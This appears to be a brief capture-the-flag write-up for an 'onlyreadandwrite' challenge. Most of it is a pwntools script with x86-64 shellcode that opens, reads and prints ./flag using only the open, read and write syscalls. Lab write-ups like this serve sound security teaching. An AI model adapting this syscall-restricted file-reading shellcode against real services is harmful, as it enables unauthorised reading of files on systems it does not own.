# onlyreadandwrite
In this challenge the program takes as input your shellcode and execute it. The constraint is that you can use only read, write and open.. so no shell to print the flag:
```python
code="""
/* open */
mov rdi, rax
add rdi, 82
mov rax, 0x2
mov rdx, 0
mov rsi, 0
syscall
mov rbx, rax /* fd */
/* read */
mov rsi, rdi
add rsi, 88
mov rdi, rbx
mov rdx, 0x2a
mov rax, 0x0
syscall
/* write */
mov rdi, 1
mov rax, 0x1
mov rdx, 0x2a
syscall
"""

shellcode=asm(code)
print(len(shellcode))
payload=shellcode+b"./flag"
r.send(payload)  
r.interactive()
```